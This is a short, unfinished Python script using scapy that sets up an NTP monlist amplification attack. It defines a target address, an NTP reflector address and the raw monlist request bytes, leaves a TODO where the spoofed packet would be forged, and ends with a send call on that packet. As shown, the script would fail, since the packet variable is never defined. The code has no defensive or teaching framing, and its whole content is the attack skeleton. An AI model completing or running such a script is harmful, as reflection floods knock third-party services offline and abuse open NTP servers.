from scapy.all import *
import random

# target server
target = 'xxx.xxx.xxx.xxx'

# ntp server
ntpserver = 'xxx.xxx.xxx.xxx'

# NTP monlist packet
data = "\x17\x00\x03\x2a" + "\x00" * 4 * 11

# TODO: forge packet here
#packet =

send(packet, loop=0)
